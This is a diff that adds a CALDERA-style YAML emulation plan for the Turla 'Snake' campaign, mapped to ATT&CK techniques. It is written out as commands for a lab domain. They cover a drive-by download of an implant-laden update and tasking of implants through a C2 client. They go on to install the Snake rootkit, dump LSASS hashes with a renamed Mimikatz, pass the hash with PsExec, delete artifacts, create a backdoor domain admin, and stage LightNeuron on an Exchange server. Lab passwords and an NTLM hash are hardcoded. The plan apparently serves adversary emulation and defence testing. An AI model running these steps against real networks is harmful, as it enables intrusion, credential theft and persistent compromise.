@@ -1,0 +1,1110 @@
+# turla_snake.yaml - CALDERA Style TTPs
+
+- emulation_plan_details:
+    id: 2c03e8df-284d-4bda-900d-1c9523fba7eb
+    adversary_name: Turla - Snake
+    adversary_description: Turla is a Russian-based threat group known for watering hole and spear phishing campaigns and leveraging in-house tools and malware.
+    attack_version: 13
+    format_version: 1.0
+
+
+# Step 11 - Initial Compromise and Establish Foothold
+
+- id: cc9d5006-80d1-4dc5-863b-c38522ad5270
+  name: RDP to first target host (User)
+  description: |
+    Use xfreerdp to RDP into the first host. Then, wait for the login to complete.
+  tactic: x
+  technique:
+    attack_id: x 
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{first.target.user}" /p:"#{first.target.password}" /v:#{first.target.ip} /cert-ignore
+        timeout: 60
+  input_arguments:
+    first.target.ip: 
+      description: The IP address of the first target host.
+      type: string
+      default: 10.100.40.103
+    first.target.user:
+      description: The username of the first target host.
+      type: string
+      default: egle
+    first.target.password:
+      description: The password of the first target host.
+      type: string
+      default: Producer1!
+    network.domain.name: 
+      description: The network domain name.
+      type: string
+      default: nk
+
+- id: 78f44095-73b0-4ab4-a4cc-e5090ae1ae44
+  name: Download malicious update (User)
+  description: |
+    Use xdotool to open Microsoft Edge, browse to nato-int.com. After redirection to anto-int.com, click to download the update 
+    (NFVersion_5e.exe) bundled with EPIC (a.k.a. Tavdig/Wipbot).
+  tactic: Initial Access
+  technique:
+    attack_id: T1189
+    name: "Drive-By Compromise"
+  procedure_group: procedure_initial_access
+  procedure_step: 11.A.1-11.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 15;
+          rdp_pid=$(ps -ef | grep '[:]#{first.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge";
+          xdotool key --window "$rdp_window" shift+colon; 
+          xdotool type --window "$rdp_window" "http";
+          xdotool key --window "$rdp_window" shift+colon; 
+          xdotool type --window "$rdp_window" "//nato-int.com/";
+          sleep 6;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 20;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool key --window "$rdp_window" --repeat 5 --delay 1 shift+Tab;
+          xdotool key --window "$rdp_window" Tab;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+        timeout: 180
+
+- id: 0328ddeb-cc6b-4971-b695-771178b50ed7
+  name: Initial compromise (User)
+  description: |
+    Run the downloaded malicious update via win+r, wait for it to finish running.
+  tactic: Execution
+  technique:
+    attack_id: T1204.002
+    name: "User Execution: Malicious File"
+  procedure_group: procedure_execution
+  procedure_step: 11.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" 'C';
+          xdotool key --window "$rdp_window" shift+colon;           
+          xdotool type --window "$rdp_window" '\Users\#{first.target.user}\Downloads\';
+          xdotool key --window "$rdp_window" shift+N; 
+          xdotool key --window "$rdp_window" shift+F; 
+          xdotool key --window "$rdp_window" shift+V;
+          xdotool type --window "$rdp_window" "ersion";
+          xdotool key --window "$rdp_window" shift+minus;
+          xdotool type --window "$rdp_window" "5e.exe";
+          sleep 6;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool key --window "$rdp_window" R;
+          sleep 6;
+        timeout: 120
+
+- id: e1d2f62e-0abf-4220-898b-4243d287466a
+  name: Log out of first target host (User)
+  description: |
+    Use xdotool to log out of the first target host
+  tactic: x
+  technique:
+    attack_id: x
+    name:  x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          xdotool key --window "$rdp_window" Ctrl+Alt+Delete;
+          sleep 6;
+          xdotool key --window "$rdp_window" Down;
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 15;
+
+- id: 49f05abe-1637-46c4-84ba-bd2fc0d6278f
+  name: Log back in to first target host (User)
+  description: |
+    Use xfreerdp to log back in
+  tactic: x
+  technique:
+    attack_id: x
+    name:  x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{first.target.user}" /p:"#{first.target.password}" /v:#{first.target.ip} /cert-ignore
+
+- id: 8d5799fe-c9b2-42a4-bb1d-a0603d9d88ea
+  name: Open Edge on first target host (User)
+  description: |
+    Using the new xfreerdp and xdotool, open Microsoft Edge, and wait 3 minutes for the EPIC implant.
+  tactic: x
+  technique:
+    attack_id: x
+    name:  x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 15;
+          rdp_pid=$(ps -ef | grep '[:]#{first.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge:";
+          sleep 6;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 180;
+        timeout: 240
+      
+- id: 32dd2b5f-5798-4c05-9d65-ee1e2d494cee
+  name: Systeminfo discovery (Adversary)
+  description: |
+    Once C2 communications have been established between EPIC and the C2 via
+    the proxy server, discovery is performed on the first host where
+    information about the host device and domain computers is collected.
+  tactic: Discovery
+  technique:
+    attack_id: T1082
+    name:  "System Information Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 11.A.6
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | systeminfo && net group "Domain Computers" /domain' --task-wait-timeout 60
+
+
+# Step 12 - Rootkit Installation
+
+- id: bd51f583-249a-4995-b5d0-7da7e824bc56
+  name: Download 1st Snake installer (Adversary)
+  description: |
+    Task the EPIC implant to download the Snake rootkit installer.
+  tactic:  Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 12.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'name | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe | snake.exe' --task-wait-timeout 60
+
+- id: 0daff7a0-d1e4-4bf2-8100-c0a824a34c52
+  name: Execute the 1st Snake installer (Adversary)
+  description: |
+    Task the EPIC implant to execute the Snake rootkit installer with the privilege escalation option
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1014
+    name: Rootkit
+  procedure_group: procedure_defense_evasion
+  procedure_step: 12.A.2-12.A.10
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 218780a0-870e-480e-b2c5dc 'exe | C:\\Users\\#{first.target.user}\\Desktop\\gusbsys.exe -f' --task-wait-timeout 60
+
+- id: cb7d5320-981f-496e-bdb0-b6535025e59e
+  name: Refresh Edge browser (User)
+  description: |
+    Use xdotool to perform a hard refresh in Edge on the first target host to
+    generate HTTP traffic and trigger the Snake implant
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(ps -ef | grep '[:]#{first.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Ctrl+Shift+R;
+
+
+# Step 13 - First Workstation Discovery
+
+- id: d042e47d-0519-41e7-a0f1-3190f3fcf43d
+  name: Run PowerShell as File Server Administrator on first target host (User)
+  description: |
+    Use xdotool to run `runas /user:#{network.domain.name}\#{file.server.admin} powershell` and to enter the user password.
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(ps -ef | grep '[:]#{first.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "powershell";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "runas /user:#{network.domain.name}\#{file.server.admin} powershell";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "#{first.target.password}";
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+  input_arguments:
+    file.server.admin: 
+      description: The username of the file server admin.
+      type: string
+      default: EgleAdmin
+
+- id: 4f222cd4-4c53-4cf5-869f-335a51711d8a
+  name: Search for File Server Administrator process in running processes (Adversary)
+  description: |
+    Task the Snake rootkit to run the process discovery command.
+  tactic: Discovery
+  technique:
+    attack_id: T1057
+    name: "Process Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 13.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}' --task-wait-timeout 60 | grep '#{file.server.admin}' -i
+
+- id: 5dbc34ff-eb4d-4897-8c4e-8288e5dd9e88
+  name: Enumerate file server admin groups (Adversary)
+  description: |
+    Execute the discovery command to confirm the user is in the file server admin's groups.
+  tactic: Discovery
+  technique:
+    attack_id: T1087.002
+    name: "Account Discovery: Domain Account"
+  procedure_group: procedure_discovery
+  procedure_step: 13.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "user /domain #{file.server.admin}"}' --task-wait-timeout 60 | grep 'File Server Admins' -i
+
+- id: 6315f9e9-a6ee-46f2-b846-24f9c3c219c9
+  name: Enumerate mapped network drives (Adversary)
+  description: |
+    Execute the discovery command to the drive mapped to the file server.
+  tactic: Discovery
+  technique:
+    attack_id: T1049
+    name: "System Network Connections Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 13.A.8
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "net.exe", "args": "use", "runas": "#{network.domain.name}\\#{first.target.user}"}' --task-wait-timeout 60 | grep #{second.target.host} -i
+  input_arguments:
+    second.target.host: 
+      description: The hostname of the second target host.
+      type: string
+      default: berzas
+
+
+# Step 14 - Lateral Movement to File Server
+
+- id: 9c65d9cc-6f72-471c-80e0-4c3029fc5e6d
+  name: Download PsExec (Adversary)
+  description: |
+    Task the implant to download PsExec.
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 14.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 4, "file": "PsExec.exe", "dest":"C:\\Windows\\System32\\file_svc_mgr.exe"}' --task-wait-timeout 60
+
+- id: f6c54eb3-f066-4721-812f-0bf6bfea01fc
+  name: Download the 2nd Snake installer (Adversary)
+  description: |
+     Task the implant to download the 2nd Snake installer.
+  tactic: Command and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 14.A.2
+  platforms: 
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 4, "file": "installer_v2.exe", "dest":"C:\\Windows\\System32\\cmu_svc_v2.exe"}' --task-wait-timeout 60
+
+- id: 0970d7d6-279a-4ad8-a334-cfe0b5e7e0a6
+  name: Execute PsExec as the File Server Administrator (Adversary)
+  description: |
+     Run the following command to execute PsExec as the file server admin, which will run the Snake installer on the file server
+  tactic: Execution
+  technique:
+    attack_id: T1569.002
+    name: "System Services: Service Execution"
+  procedure_group: procedure_execution
+  procedure_step: 14.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 3, "proc": "C:\\Windows\\System32\\file_svc_mgr.exe", "args":"\\\\#{second.target.host} -accepteula -s -c C:\\Windows\\System32\\cmu_svc_v2.exe", "runas":"#{network.domain.name}\\#{file.server.admin}"}' --task-wait-timeout 120
+        timeout: 120
+
+- id: 2386792f-7bc9-445d-b868-64a0031ea40d
+  name: RDP to second target host (User)
+  description: |
+    Xfreerdp to the second target host as second victim user. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{file.server.admin}" /p:"#{first.target.password}" /v:#{second.target.ip} /cert-ignore
+  input_arguments:
+    second.target.ip: 
+      description: The IP address of the second target host.
+      type: string
+      default: 10.100.30.204
+
+- id: a2e76ec5-6417-4da6-8a16-62ad85b49fa8
+  name: Navigate to google.com on second target host (User)
+  description: |
+    On the second target host, wait for the RDP to complete. Then, use xdotool to open Edge and navigate to google.com. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 15;
+          rdp_pid=$(ps -ef | grep '[:]#{second.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool mousemove --window "$rdp_window" 100 100 click 1;
+          xdotool key --window "$rdp_window" Ctrl+Escape;
+          sleep 6;
+          xdotool type --window "$rdp_window" "run";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge:https://google.com";
+          xdotool key --window "$rdp_window" Return;
+
+- id: 057a6b9b-36d6-456d-aa28-66e61295dd9c
+  name: Delete artifacts from first target host (Adversary)
+  description: |
+    After the new beacon is received, remove files from the first target.
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 14.A.6
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 534b40585d514b554844 '{"type": 1, "command": "del /Q C:\\Windows\\System32\\file_svc_mgr.exe C:\\Windows\\System32\\cmu_svc_v2.exe"}' --task-wait-timeout 60
+
+
+# Step 15 - Domain Discovery
+
+- id: 79dae739-fd89-4842-946e-a4675110814e
+  name: Check if ActiveDirectory is installed (Adversary)
+  description: |
+    Task Snake to check if the ActiveDirectory PowerShell module is installed.
+  tactic: Execution
+  technique:
+    attack_id: T1059.001
+    name: "Command and Scripting Interpreter: Powershell"
+  procedure_group: procedure_execution
+  procedure_step: 15.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Get-Module -ListAvailable -Name ActiveDirectory"}' --task-wait-timeout 60 | grep ActiveDirectory -i
+
+- id: 70a19730-04e9-45be-8463-7a359eaee657
+  name: Enumerate Active Directory groups (Adversary)
+  description: |
+    Task Snake to collect a list of Active Directory groups containing the word "management", as members of these groups will likely have elevated permissions on the network. Confirm existence of a "Server Management" group.
+  tactic: Discovery
+  technique:
+    attack_id: T1069.001
+    name: "Permission Group Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 15.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroup -Filter * | Where-Object Name -Match \"management\" | Select Name"}' --task-wait-timeout 60 | grep 'Server Management' -i
+
+- id: bb06008c-561b-4a98-992e-fb7a0432aa45
+  name: Enumerate accounts belonging to the Server Management domain group (Adversary)
+  description: |
+    Task Snake to obtain the usernames of accounts within the Server Management domain group. This will instruct Turla which users to target next. Confirm the domain admin user is a member.
+  tactic: Discovery
+  technique:
+    attack_id: T1069.001
+    name: "Permission Group Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 15.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Server Management\" | Select Name,SamAccountName"}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
+  input_arguments:
+    domain.admin.user: 
+      description: The username of a domain admin.
+      type: string
+      default: ZilvinasAdmin
+
+- id: 8649c19c-0e25-43f3-a267-e0c0c92dd74f
+  name: Enumerate accounts belonging to the Domain Admins domain group (Adversary)
+  description: |
+    Task Snake to obtain the usernames of accounts within the Domain Admins domain group. Confirm the domain admin user is a member.
+  tactic: Discovery
+  technique:
+    attack_id: T1069.001
+    name: "Permission Group Discovery: Domain Groups"
+  procedure_group: procedure_discovery
+  procedure_step: 15.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADGroupMember -Identity \"Domain Admins\" | Select Name,SamAccountName"}' --task-wait-timeout 60 | grep #{domain.admin.user} -i
+
+- id: d761e02e-fea4-457e-a434-aa49383b7996
+  name: Enumerate account information (Adversary)
+  description: |
+    Task Snake to discover domain users.
+  tactic: Discovery
+  technique:
+    attack_id: T1087.002
+    name: "Account Discovery: Domain Account"
+  procedure_group: 
+  procedure_step: 15.A.4
+  platforms:
+    linux:
+      sh:
+        command: |
+          output=$(./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADUser -Filter {LastLogonDate -ne 0} -Properties * | Select Name,SamAccountName"}' --task-wait-timeout 60);
+          echo $output | grep '#{second.target.user}' -iw && echo $output | grep '#{domain.admin.user}' -i
+
+- id: 44daae27-4c78-4a38-9a68-88aeabd87a32
+  name: Enumerate domain computer information (Adversary)
+  description: |
+    Task Snake to obtain a list of domain computers and some of their information (IP addresses, DNS names, and description).
+  tactic: Discovery
+  technique:
+    attack_id: T1018
+    name: Remote System Discovery
+  procedure_group: 
+  procedure_step: 15.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          output=$(./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 2, "command": "$ProgressPreference = \"SilentlyContinue\"; Import-Module ActiveDirectory; Get-ADComputer -Filter * -Properties * | Select Name,DnsName,IPv4Address,Description"}' --task-wait-timeout 60);
+          echo $output | grep '#{second.target.user} Workstation' -i && echo $output | grep '#{fourth.target.host}' -i
+  input_arguments:
+    fourth.target.host: 
+      description: The hostname of the fourth target host.
+      type: string
+      default: drebule
+    second.target.user: 
+      description: The username of the second target host.
+      type: string
+      default: Zilvinas
+
+
+# Step 16 - Preparation for Lateral Movement to Admin Workstation
+
+- id: bc88a0f3-245f-46a7-be47-42538fd0521d
+  name: Download Mimikatz to file server (Adversary)
+  description: |
+    Task Snake to download Mimikatz to the file server.
+  tactic: Commmand and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 16.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 4, "file": "mimikatz.exe", "dest": "C:\\Windows\\System32\\loadperf.exe"}' --task-wait-timeout 60
+
+- id: 55bef1eb-e1b5-46c6-94b9-a9637688d114
+  name: Download PsExec to the file server (Adversary)
+  description: |
+    Task Snake to download PsExec to the file server.
+  tactic: Commmand and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 16.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 4, "file": "PsExec.exe", "dest": "C:\\Windows\\System32\\fs_mgr.exe"}' --task-wait-timeout 60
+
+- id: 095324d9-a6e8-4964-a5ba-92fff6907c2e
+  name: Download 3rd Snake installer to the file server (Adversary)
+  description: |
+    Task Snake to download the 3rd Snake installer to the file server.
+  tactic: Commmand and Control
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  procedure_group: procedure_command_and_control
+  procedure_step: 16.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 4, "file": "installer_v3.exe", "dest":"C:\\Windows\\System32\\cmu_svc.exe"}' --task-wait-timeout 60
+
+- id: 256ed126-a10c-4736-a074-216ab90da8f2
+  name: Dump NTLM hashes on the file server (Adversary)
+  description: |
+    Task Snake to run Mimikatz to dump all NTLM hashes from LSASS.exe.
+  tactic: Credential Access
+  technique:
+    attack_id: T1003.001
+    name: "OS Credential Dumping: LSASS Memory"
+  procedure_group: procedure_credential_access
+  procedure_step: 16.A.3 
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::lop\" \"quit\""}' --task-wait-timeout 60 | grep #{domain.admin.ntlm}
+  input_arguments:
+    domain.admin.ntlm: 
+      description: The NTLM of a domain admin.
+      type: string
+      default: f3fcd61f987a97da49ce5f650b4e6539
+
+
+# Step 17 - Lateral Movement to Admin Workstation and Persistence
+
+- id: b4018de2-bb0c-493e-8fe3-5f355831012f
+  name: Install the 3rd Snake installer on the third target host (Adversary)
+  description: |
+    Task Snake to pass-the-hash using the previously discovered NTLM hash to run PsExec and install Snake on the target workstation.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1550.002
+    name: "Use Alternate Authentication Material: Pass the Hash"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 17.A.1 
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 3, "proc": "C:\\Windows\\System32\\loadperf.exe", "args": "\"pr::d\" \"slsa::htp /user:#{domain.admin.user} /ntlm:#{domain.admin.ntlm} /domain:#{network.domain.name}.local /remotepc:#{third.target.host} /pexe:C:\\Windows\\System32\\fs_mgr.exe /sys:1 /prun:C:\\Windows\\System32\\cmu_svc.exe\" \"quit\""}' --task-wait-timeout 60
+  input_arguments:
+    third.target.host: 
+      description: The hostname of the third target host.
+      type: string
+      default: uosis
+
+- id: 42859ec4-b714-48ca-be74-9438bbbaaf7b
+  name: RDP to the third target host (User)
+  description: |
+    Xfreerdp to the third host as the third target user
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp /u:"#{network.domain.name}\\#{second.target.user}" /p:"#{second.target.password}" /v:#{third.target.ip} /cert-ignore
+  input_arguments:
+    second.target.password:
+      description: The password of the second target user.
+      type: string
+      default: Producer2!
+    third.target.ip:
+      description: The IP address of the third target host.
+      type: string
+      default: 10.100.40.102
+
+- id: eddd5776-886a-4cde-97b7-46bf095ea049
+  name: Open Edge & run PowerShell as the domain admin on third target host (User)
+  description: |
+    Using xdotool, open Edge browser, wait, and open admin powershell. 
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          rdp_pid=$(ps -ef | grep '[:]#{third.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" "microsoft-edge:";
+          sleep 6;
+          xdotool key --window "$rdp_window" Tab; sleep 1;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" "powershell";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "runas /user:#{network.domain.name}\#{domain.admin.user} powershell";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "#{second.target.password}";
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+
+- id: ca32f105-2e35-4524-8589-0f71d92d98f6
+  name: Delete artifacts from the file server (Adversary)
+  description: |
+    Delete PsExec, the Snake installer, and Mimikatz from the file server.
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal: File Deletion"
+  procedure_group: 
+  procedure_step: 17.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 5054474d50435a51404b '{"type": 1, "command": "del /Q C:\\Windows\\System32\\fs_mgr.exe C:\\Windows\\System32\\loadperf.exe C:\\Windows\\System32\\cmu_svc.exe"}' --task-wait-timeout 60
+
+- id: 27083aa1-9a0d-4fe4-9154-fa6f0598e2f9
+  name: Enumerate processes (Adversary)
+  description: |
+    Task Snake to enumerate running processes on the machine to discover processes under the domain admin.
+  tactic: Discovery
+  technique:
+    attack_id: T1057
+    name: Process Discovery
+  procedure_group: procedure_discovery
+  procedure_step: 17.A.4 
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 3, "proc": "tasklist.exe", "args": "/v"}' --task-wait-timeout 60 | grep '#{domain.admin.user}' -i
+
+- id:  384f3d1f-97f1-4070-98c5-764de023ed2c
+  name: Create a new domain user (Adversary)
+  description: |
+    Task Snake to create a new domain user using an access token from one of the domain admin processes. 
+    The new domain user will be used as a backdoor domain admin account for persistence on the domain.
+  tactic: Persistence
+  technique:
+    attack_id: T1136.002
+    name: "Create Account: Domain Account"
+  procedure_group: procedure_persistence
+  procedure_step: 17.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "net user #{new.domain.user} #{new.domain.password} /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+  input_arguments:
+    new.domain.user:
+      description: The username of the new domain user.
+      type: string
+      default: leshy
+    new.domain.password:
+      description: The password of the new domain user.
+      type: string
+      default: Password12345
+
+- id: 36d93251-6932-49b9-82ad-994abd27730a
+  name: Add the new domain user to the Domain Admins group (Adversary)
+  description: |
+    Task Snake to create a new domain admin using the domain admin's access token.
+  tactic: Persistence
+  technique:
+    attack_id: T1136.002
+    name: "Create Account: Domain Account"
+  procedure_group: procedure_persistence
+  procedure_step: 17.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "net group \"Domain Admins\" #{new.domain.user} /add /domain", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+
+
+# Step 18 - Lateral Movement to Exchange Server
+
+- id: c5bceb16-2f13-40a5-b460-9adb1d567b76
+  name: Download LightNeuron (Adversary)
+  description: |
+    Task Snake to download LightNeuron
+  tactic: Execution
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  procedure_group: procedure_execution
+  procedure_step: 18.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "ln_transport_agent.dll", "dest":"C:\\Windows\\System32\\mtxconf.dll"}' --task-wait-timeout 60
+
+- id: b43fb6c6-05d2-42ff-9083-e70d5dbea078
+  name: Download the companion DLL for LightNeuron (Adversary)
+  description: |
+    Task Snake to download the companion DLL for LightNeuron.
+  tactic: Execution
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  procedure_group: procedure_execution
+  procedure_step: 18.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "n_installer_aux.dll", "dest":"C:\\Windows\\System32\\mtxcli.dll"}' --task-wait-timeout 60
+
+- id: bcea95e5-76a0-4774-b51d-cdf6b1fd9ce0
+  name: Download the Powershell installation script for LightNeuron (Adversary)
+  description: |
+    Task Snake to download the Powershell installation script for LightNeuron.
+  tactic: Execution
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  procedure_group: procedure_execution
+  procedure_step: 18.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "msiex.ps1", "dest":"C:\\Windows\\System32\\msiex.ps1"}' --task-wait-timeout 60
+
+- id: 62f66621-1ff8-4054-bbd8-b3f374d55199
+  name: Download the LightNeuron email rules file (Adversary)
+  description: |
+    Task Snake to download the LightNeuron email rules file.
+  tactic: Execution
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  procedure_group: procedure_execution
+  procedure_step: 18.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "rules.xml", "dest":"C:\\Windows\\System32\\wdr.rules.xml"}' --task-wait-timeout 60
